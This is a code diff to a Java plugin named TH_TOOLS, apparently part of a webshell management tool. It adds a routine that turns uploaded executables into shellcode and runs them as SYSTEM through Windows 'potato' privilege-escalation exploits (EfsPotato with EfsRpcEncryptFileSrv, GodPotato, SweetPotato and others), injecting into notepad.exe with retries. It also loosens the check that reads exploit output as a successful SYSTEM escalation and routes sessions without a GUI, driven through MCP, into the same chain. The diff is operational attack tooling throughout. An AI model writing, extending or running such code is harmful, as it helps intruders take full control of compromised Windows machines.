@@ -90,6 +90,7 @@ public abstract class TH_TOOLS implements Plugin {
     public String shellcodeHex;
     public static final String ENV_TH_TOOLS_ELEVATE_ENABLED = "TH_TOOLS_ELEVATE_ENABLED";
     public static final String ENV_TH_TOOLS_EXECUTE_FILE = "TH_TOOLS_EXECUTE_FILE";
+    public static final String ENV_TH_TOOLS_POTATO_PLUGIN = "TH_TOOLS_POTATO_PLUGIN";
     private static final int PF_SCAN_MAX_DEPTH = 12;
     private static final int PF_SCAN_MAX_FILES = 5000;
     /** \u4e0e\u4e0b\u62c9\u6846\u7b2c\u4e00\u9879\u6587\u6848\u5fc5\u987b\u5b8c\u5168\u4e00\u81f4\uff08\u542b contains \u5224\u65ad\uff09 */
@@ -302,9 +303,7 @@ public abstract class TH_TOOLS implements Plugin {
 
                     this.markGlobalElevateEnabled();
                     if (!alreadyEnabled) {
-                        GOptionPane.showMessageDialog(this.corePanel,
-                            "\u63d0\u6743\u6210\u529f(SYSTEM)\u3002\u540e\u7eed\u529f\u80fd\u5c06\u9ed8\u8ba4\u5411\u8be5\u8fdb\u7a0b\u6ce8\u5165\uff0c\u8bf7\u5728 TH_TOOLS \u4e2d\u786e\u8ba4\u3002",
-                            "\u63d0\u793a", 1);
+                        showElevateSuccessDialog();
                     }
                 } else {
                      String upper = resultString != null ? resultString.toUpperCase(Locale.ENGLISH) : "";
@@ -332,9 +331,7 @@ public abstract class TH_TOOLS implements Plugin {
                     boolean alreadyEnabled = isGlobalElevateEnabled(this.shellEntity);
                     this.markGlobalElevateEnabled();
                     if (!alreadyEnabled) {
-                        GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.corePanel),
-                            "\u63d0\u6743\u6210\u529f(SYSTEM)\u3002\u540e\u7eed\u529f\u80fd\u5c06\u9ed8\u8ba4\u5411\u8be5\u8fdb\u7a0b\u6ce8\u5165\uff0c\u8bf7\u5728 TH_TOOLS \u4e2d\u786e\u8ba4\u3002",
-                            "\u63d0\u793a", 1);
+                        showElevateSuccessDialog();
                     }
                 }
             }
@@ -594,9 +591,7 @@ public abstract class TH_TOOLS implements Plugin {
                          boolean alreadyEnabled = isGlobalElevateEnabled(this.shellEntity);
                          this.markGlobalElevateEnabled();
                          if (!alreadyEnabled) {
-                             GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.corePanel),
-                                 "\u63d0\u6743\u6210\u529f(SYSTEM)\u3002\u540e\u7eed\u529f\u80fd\u5c06\u9ed8\u8ba4\u5411\u8be5\u8fdb\u7a0b\u6ce8\u5165\uff0c\u8bf7\u5728 TH_TOOLS \u4e2d\u786e\u8ba4\u3002",
-                                 "\u63d0\u793a", 1);
+                             showElevateSuccessDialog();
                          }
                     }
                 } catch (Exception var6) {
@@ -710,7 +705,23 @@ public abstract class TH_TOOLS implements Plugin {
         }
 
         String upper = resultString.toUpperCase(Locale.ENGLISH);
-        return upper.contains("NT AUTHORITY\\SYSTEM") || upper.contains("NT AUTHORITY/SYSTEM") || upper.contains("S-1-5-18");
+        if (upper.contains("NT AUTHORITY\\SYSTEM") || upper.contains("NT AUTHORITY/SYSTEM") || upper.contains("S-1-5-18")) {
+            return true;
+        }
+        if (upper.contains("NT AUTHORITY") && upper.contains("SYSTEM")) {
+            return true;
+        }
+        // EfsPotato / potato logs often succeed without printing whoami
+        return upper.contains("GET TOKEN") && (upper.contains("PROCESS WITH PID") || upper.contains("BINDING OK"));
+    }
+
+    /** Avoid GOptionPane/EasyI18N mojibake on GBK/UTF-8 mixed sources. */
+    private void showElevateSuccessDialog() {
+        javax.swing.JOptionPane.showMessageDialog(
+                this.corePanel,
+                "\u63d0\u6743\u6210\u529f (NT AUTHORITY\\SYSTEM)",
+                "TH_TOOLS",
+                javax.swing.JOptionPane.INFORMATION_MESSAGE);
     }
 
     private void markGlobalElevateEnabled() {
@@ -719,6 +730,10 @@ public abstract class TH_TOOLS implements Plugin {
         }
 
         this.shellEntity.setEnv(ENV_TH_TOOLS_ELEVATE_ENABLED, "true");
+        if (this.CurrentPlugin != null && !this.CurrentPlugin.isEmpty()
+                && !PLUGIN_OPTION_NONE.equals(this.CurrentPlugin)) {
+            this.shellEntity.setEnv(ENV_TH_TOOLS_POTATO_PLUGIN, this.CurrentPlugin);
+        }
 
         if (this.excuteFileComboBox != null) {
             Object selected = this.excuteFileComboBox.getSelectedItem();
@@ -749,14 +764,12 @@ public abstract class TH_TOOLS implements Plugin {
                     if (executeFile != null && thTools.excuteFileComboBox != null) {
                         thTools.excuteFileComboBox.setSelectedItem(executeFile);
                     }
-
-                    return thTools.runNetPe(args, pe, readWait, printWriter);
+                    return runPeWithThTools(thTools, loader, args, pe, readWait, printWriter);
                 }
                 if (plugin == null && shellEntity.getFrame() == null) {
-                    // MCP 无 frame 会话: 自建 TH_TOOLS 实例走提权执行链
                     TH_TOOLS thTools = createThToolsInstance(shellEntity);
                     if (thTools != null) {
-                        return thTools.runNetPe(args, pe, readWait, printWriter);
+                        return runPeWithThTools(thTools, loader, args, pe, readWait, printWriter);
                     }
                 }
             } catch (Throwable var7) {
@@ -764,6 +777,101 @@ public abstract class TH_TOOLS implements Plugin {
         }
 
         return loader.runPe2(args, pe, readWait);
+    }
+
+    /** .NET PE uses runNetPe; native PE uses stock runPe2. */
+    private static byte[] runPeWithThTools(TH_TOOLS thTools, ShellcodeLoader loader, String args, byte[] pe, int readWait, PrintStream printWriter) throws Exception {
+        try {
+            return thTools.runNetPe(args, pe, readWait, printWriter);
+        } catch (UnsupportedOperationException ignored) {
+            return loader.runPe2(args, pe, readWait);
+        }
+    }
+
+    public byte[] runNativePeElevated(String args, byte[] pe, int readWait, PrintStream printWriter) throws Exception {
+        byte[] shellcode = PeLoader.peToShellcode(pe, printWriter);
+        if (shellcode == null || shellcode.length == 0) {
+            throw new UnsupportedOperationException("PeToShellcode \u5931\u8d25");
+        }
+        String potato = this.shellEntity != null
+                ? this.shellEntity.getEnv(ENV_TH_TOOLS_POTATO_PLUGIN, this.CurrentPlugin)
+                : this.CurrentPlugin;
+        if (potato == null || potato.isEmpty() || PLUGIN_OPTION_NONE.equals(potato)) {
+            potato = "EfsPotato";
+        }
+        this.CurrentPlugin = potato;
+        PluginInfo info = this.SearchPluginByName(this.CurrentPlugin);
+        if (info == null) {
+            throw new IllegalStateException("plugin not found: " + potato);
+        }
+        if (!this.loadPlugin(this.CurrentPlugin)) {
+            throw new IllegalStateException("plugin load failed: " + potato);
+        }
+        String host = this.shellEntity != null ? this.shellEntity.getEnv(ENV_TH_TOOLS_EXECUTE_FILE, (String) null) : null;
+        if (host == null || host.isEmpty()) {
+            if (this.excuteFileComboBox != null && this.excuteFileComboBox.getSelectedItem() != null) {
+                host = this.excuteFileComboBox.getSelectedItem().toString();
+            } else {
+                host = this.payload != null && this.payload.isX64()
+                        ? "C:\\Windows\\System32\\notepad.exe"
+                        : "C:\\Windows\\SysWOW64\\notepad.exe";
+            }
+        }
+        if (host.toLowerCase(Locale.ENGLISH).contains("werfault")) {
+            host = this.payload != null && this.payload.isX64()
+                    ? "C:\\Windows\\System32\\notepad.exe"
+                    : "C:\\Windows\\SysWOW64\\notepad.exe";
+        }
+        String cmd = (args == null || args.trim().isEmpty()) ? host : host + " " + args;
+        int wait = readWait < 15000 ? 15000 : readWait;
+        this.Excute_cmd = cmd;
+        this.shellcodeHex = functions.byteArrayToHex(shellcode);
+        ReqParameter parameter = new ReqParameter();
+        parameter.add("cmd", cmd);
+        parameter.add("shellcode", shellcode);
+        parameter.add("readWait", Integer.toString(wait));
+        parameter.add("RPCTimeOut", "120000");
+        parameter.add("timeout", "120000");
+        String name = info.getDisplayName();
+        if ("EfsPotato".equals(name)) {
+            parameter.add("pipe", "lsarpc");
+            parameter.add("exploitMethod", "EfsRpcEncryptFileSrv");
+            return this.evalPotatoWithRetry("EfsPotato.Run", parameter);
+        }
+        if ("BadPotato".equals(name)) {
+            return this.evalPotatoWithRetry("BadPotato.Run", parameter);
+        }
+        if ("GodPotato".equals(name)) {
+            return this.evalPotatoWithRetry("GodPotato.Run", parameter);
+        }
+        if ("SweetPotato".equals(name)) {
+            parameter.add("clsid", "4991D34B-80A1-4291-83B6-3328366B9097");
+            return this.evalPotatoWithRetry("SweetPotato.Run", parameter);
+        }
+        if ("PrintNotifyPotato".equals(name)) {
+            return this.evalPotatoWithRetry("PrintNotifyPotato.Run", parameter);
+        }
+        return this.ExeCuteShellcode();
+    }
+
+    private byte[] evalPotatoWithRetry(String className, ReqParameter parameter) {
+        byte[] last = null;
+        for (int i = 0; i < 3; i++) {
+            if (i > 0) {
+                try {
+                    Thread.sleep(2500L);
+                } catch (InterruptedException ie) {
+                    Thread.currentThread().interrupt();
+                    break;
+                }
+            }
+            last = this.payload.evalFunc(className, "run", parameter);
+            String text = last == null ? "" : (this.encoding != null ? this.encoding.Decoding(last) : new String(last));
+            if (text != null && !text.toLowerCase(Locale.ENGLISH).contains("timed out")) {
+                return last;
+            }
+        }
+        return last;
     }
 
     /** MCP 兼容: 按 shell payload 类型自建 TH_TOOLS 实例 (绕过 GUI frame 依赖) */
